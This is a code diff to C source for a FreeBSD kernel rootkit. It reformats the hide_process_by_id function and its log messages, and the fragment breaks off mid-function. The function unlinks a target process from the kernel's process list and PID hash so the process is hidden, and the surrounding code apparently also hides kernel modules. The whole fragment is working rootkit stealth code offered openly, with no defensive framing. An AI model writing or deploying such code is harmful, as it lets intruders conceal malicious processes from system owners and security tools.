@@ -108,25 +108,32 @@ hide_kld(char *ko_name)
 	mtx_unlock(&Giant);
 }
 
-void hide_process_by_id(pid_t id){
-	struct proc *p;	
-	
+void
+hide_process_by_id(pid_t id)
+{
+	struct proc *p;
+
 	sx_slock(&allproc_lock);
-	
-	/* Two options. Iterate over pidhashtabl, or allproc_list. 
-	*  Better performance over pidhashtabl */
-	LIST_FOREACH(p, PIDHASH(id), p_list){
-		LOGI("Checking PID:%d\n", p->pid)
-		if(p->p_pid == id)
+
+	/* Two options.
+	 * 1. Iterate over pidhashtabl.
+	 * 2. Iterate over allproc_list.
+	 *
+	 * Better performance over pidhashtabl. */
+	LIST_FOREACH(p, PIDHASH(id), p_list)
+	{
+		LOGI("[rootkit:hide_process_by_id] Checking PID: %d\n", p->pid);
+		if (p->p_pid == id)
 		{
-			/* A process is either NEW, NORMAL, ZOMBIE 
-			*  ( new means in creation , see proc.h ) */
-			if(p->p_state == PRS_NEW)
-			{ 
+			/* A process is either NEW, NORMAL, ZOMBIE
+			 * (new means in creation, see proc.h). */
+			if (p->p_state == PRS_NEW)
+			{
 				p = NULL;
 				break;
 			}
-			LOGI("Found PID, Removing from p_list, p_hash\n")
+
+			LOGI("[rootkit:hide_process_by_id] Removing PID: %d\n", p->pid);
 			PROC_LOCK(p);
 
 			LIST_REMOVE(p, p_list);
